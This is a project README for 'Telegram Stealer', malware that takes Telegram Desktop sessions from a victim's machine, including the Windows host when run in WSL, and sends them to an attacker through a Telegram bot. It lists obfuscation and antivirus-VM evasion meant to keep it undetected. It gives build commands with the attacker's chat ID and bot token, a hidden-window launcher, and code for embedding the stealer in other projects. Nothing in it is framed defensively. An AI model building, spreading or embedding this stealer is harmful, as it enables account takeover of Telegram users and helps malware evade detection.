# Telegram Stealer

Steal Telegram Desktop sessions.

If the stealer is started inside WSL, it will get the Telegram Desktop sessions from its Windows host.

**Note:** If the target configured a local password in Telegram Desktop, the sessions will be encrypted, so you would need the password to unlock it.

## Demo

https://youtu.be/3mKOwtCnwYw

## Features

- Steal Telegram Desktop sessions
- Works on all platforms, including WSL (on WSL, the binary will get the sessions from its Windows host)
- If Telegram Desktop is not in appData (i.e. portable installation), inspect the `Telegram.exe` running process to find its path (Windows or WSL only)
- Source is highly obfuscated using [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator)
- Output binary is packaged to a single portable binary using [pkg](https://github.com/vercel/pkg)
- Send sessions via Telegram using webhooks
- Try to detect some anti-virus virtual machines to be FUD as long as possible

## Build

Install dependencies

```sh
npm i -D
npm i -g pkg
```

Build

```sh
npm run build <chat_id> <bot_token>

# Create the stealer binary, choose target system and architecture
npm run pkg-windows
npm run pkg-linux
npm run pkg-linux-arm
npm run pkg-macos
npm run pkg-macos-arm
```

## Run

Run the `hello` binary.

To hide the console window on a Windows machine, you can run the script using the provided VB script (see [`run_hidden_windows.vbs`](./run_hidden_windows.vbs)).

## Include in your project

```sh
npm install https://github.com/rigwild/telegram-stealer.git
```

```ts
import { run as stealTelegram } from 'telegram-stealer'

type StealTelegram = (
  telegramChatId: string,
  telegramToken: string,
  archivePassword?: string,
  waitOnStart?: boolean
) => Promise<void>

await stealTelegram('<chat_id>', '<bot_token>', '<archivePassword>', false)
```

## License

[The MIT license](./LICENSE)
